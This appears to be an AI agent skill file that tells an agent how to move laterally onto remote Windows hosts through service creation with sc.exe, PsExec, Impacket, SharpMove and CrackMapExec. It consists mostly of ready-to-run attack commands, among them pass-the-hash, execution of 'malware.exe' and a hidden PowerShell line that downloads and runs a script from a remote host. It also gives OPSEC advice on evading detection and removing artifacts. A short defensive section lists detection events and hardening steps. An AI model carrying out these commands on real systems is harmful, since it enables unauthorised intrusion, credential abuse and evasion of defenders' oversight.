---
name: windows-service-lateral-movement
description: Execute commands on remote Windows hosts via Service Control Manager (SCM) using PsExec, SMBExec, or manual service creation. Use this skill whenever you need to run commands on a remote Windows machine where you have local admin credentials, especially for lateral movement, remote execution, or when other methods (WMI, WinRM) are unavailable. Trigger on requests involving: remote Windows command execution, PsExec, service-based execution, lateral movement via SMB, or when you have admin credentials and need to run commands on a target host.
---

# Windows Service-Based Lateral Movement

Execute commands on remote Windows hosts by abusing the Service Control Manager (SCM) over SMB/RPC. This skill covers PsExec, SMBExec, and manual service creation techniques.

## When to Use This Skill

Use this skill when:
- You have local administrator credentials on a target Windows host
- You need to execute commands remotely and WMI/WinRM are unavailable or blocked
- You're performing lateral movement in a Windows environment
- You need to run commands as SYSTEM or a specific user on a remote host
- SMB (port 445) and ADMIN$ share are accessible on the target

## Prerequisites

Before attempting service-based execution, verify:

1. **Credentials**: Local Administrator on target (requires SeCreateServicePrivilege)
2. **Network**: SMB (TCP/445) reachable, ADMIN$ share available
3. **Firewall**: Remote Service Management allowed through host firewall
4. **Authentication**: 
   - Use hostname/FQDN for Kerberos authentication
   - IP addresses may fall back to NTLM (blocked in hardened environments)
5. **UAC Considerations**: Local accounts may be token-filtered over network unless using built-in Administrator or LocalAccountTokenFilterPolicy=1

## Technique Overview

The common flow for service-based execution:

1. Authenticate to target and access ADMIN$ share over SMB
2. Copy an executable OR specify a LOLBAS command line
3. Create a service remotely via SCM (MS-SCMR over \\PIPE\\svcctl)
4. Start the service to execute the payload
5. Stop the service and clean up (delete service and dropped binaries)

---

## Method 1: Manual Service Creation via sc.exe

Use native Windows `sc.exe` for minimal, fileless execution.

### Fileless Command Execution

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\\\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\\\TARGET start HTSvc
sc.exe \\\\TARGET delete HTSvc
```

### With Dropped Payload

```cmd
:: Copy payload to ADMIN$ and execute
sc.exe \\\\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\\\TARGET start HTSvc
sc.exe \\\\TARGET delete HTSvc
```

**Notes:**
- Expect timeout errors when starting non-service EXEs; execution still occurs
- For OPSEC, prefer fileless commands (cmd /c, powershell -enc)
- Delete dropped artifacts immediately after execution

---

## Method 2: Sysinternals PsExec

Classic admin tool that drops PSEXESVC.exe in ADMIN$, installs a temporary service, and proxies I/O over named pipes.

### Basic Usage

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\\\HOST -s -i cmd.exe

:: Run command as specific domain user
PsExec64.exe -accepteula \\\\HOST -u DOMAIN\\user -p 'Password' cmd.exe /c whoami /all

:: Customize service name for OPSEC
PsExec64.exe -accepteula \\\\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

### From Sysinternals Live (No Local Copy)

```cmd
\\live.sysinternals.com\\tools\\PsExec64.exe -accepteula \\\\HOST -s cmd.exe /c whoami
```

### Common Flags

| Flag | Description |
|------|-------------|
| `-s` | Run as SYSTEM |
| `-u` | Specify username |
| `-p` | Specify password |
| `-r` | Custom service name (OPSEC) |
| `-i` | Interactive mode |
| `-accepteula` | Accept EULA (required) |

**Artifacts Created:**
- Service install/uninstall events (Service name: PSEXESVC unless `-r` used)
- C:\\Windows\\PSEXESVC.exe during execution
- Registry: HKCU\\Software\\Sysinternals\\PsExec\\EulaAccepted on operator host

---

## Method 3: Impacket psexec.py

Python-based PsExec clone using embedded RemCom-like service.

### Authentication Methods

```bash
# Password authentication
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (with tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Custom service name and encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

### Common Flags

| Flag | Description |
|------|-------------|
| `-hashes` | LM:NT hash authentication |
| `-k` | Use Kerberos |
| `-no-pass` | No password (Kerberos tickets) |
| `-dc-ip` | Domain controller IP |
| `-service-name` | Custom service name |
| `-codec` | Output encoding |

**Artifacts Created:**
- Temporary EXE in C:\\Windows\\ (random 8 characters)
- Service name defaults to RemComSvc unless overridden

---

## Method 4: Impacket smbexec.py

Creates temporary service spawning cmd.exe with named pipe I/O. Generally avoids dropping full EXE payload.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

---

## Method 5: SharpLateral / SharpMove

C# tools for lateral movement including service-based execution.

### SharpLateral

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe malware.exe ServiceName
```

### SharpMove

```cmd
:: Modify/create service
SharpMove.exe action=modsvc computername=remote.host.local command="C:\\windows\\temp\\payload.exe" amsi=true servicename=TestService

:: Start the service
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

---

## Method 6: CrackMapExec

Multi-backend lateral movement tool.

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

---

## OPSEC Considerations

### Detection Artifacts

Be aware these techniques create the following artifacts:

**Security Events:**
- 4624 (Logon Type 3) and 4672 (Special Privileges) on target
- 5140/5145 File Share events showing ADMIN$ access
- 7045 Service Install events (service names: PSEXESVC, RemComSvc, or custom)

**Sysmon Events:**
- Event 1 (Process Create) for services.exe or service image
- Event 3 (Network Connect)
- Event 11 (File Create) in C:\\Windows\\
- Event 17/18 (Pipe Created/Connected) for pipes like \\\\..\\pipe\\psexesvc

**Registry:**
- HKCU\\Software\\Sysinternals\\PsExec\\EulaAccepted=0x1 on operator host

### OPSEC Recommendations

1. **Customize service names** to avoid PSEXESVC/RemComSvc patterns
2. **Prefer fileless commands** (cmd /c, powershell -enc) over dropped binaries
3. **Delete artifacts immediately** after execution
4. **Use Kerberos** (hostname/FQDN) instead of NTLM when possible
5. **Time operations** to blend with normal administrative activity
6. **Consider EDR** - some tools may be blocked or monitored

---

## Troubleshooting

| Error | Cause | Solution |
|-------|-------|----------|
| Access denied (5) | Not truly local admin, UAC restrictions, or EDR protection | Verify admin rights, check UAC Remote Restrictions, use built-in Administrator |
| Network path not found (53) | Firewall blocking SMB/RPC or admin shares disabled | Check firewall rules, verify ADMIN$ share exists |
| Kerberos fails, NTLM blocked | Connecting by IP or to non-Kerberos server | Use hostname/FQDN, ensure proper SPNs, or supply Kerberos tickets |
| Service start timeout | Not a real service binary | Expected behavior; capture output to file or use smbexec for live I/O |

---

## Hardening Notes

**Windows 11 24H2 / Server 2025 Changes:**
- SMB signing required by default for outbound connections
- New SMB client NTLM blocking prevents NTLM fallback when connecting by IP
- Use Kerberos (hostname/FQDN) in hardened environments

**Defense Recommendations:**
- Minimize local admin membership
- Prefer Just-in-Time/Just-Enough Admin
- Enforce LAPS for local admin password management
- Monitor and alert on 7045 service install events
- Block or monitor SMB/RPC from untrusted sources

---

## Related Techniques

- **WMI-based execution**: Often more fileless, see `wmiexec.md`
- **WinRM-based execution**: See `winrm.md`

---

## References

- [PsExec - Sysinternals](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [SMB Security Hardening](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [Using Credentials to Own Windows Boxes - Part 2](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
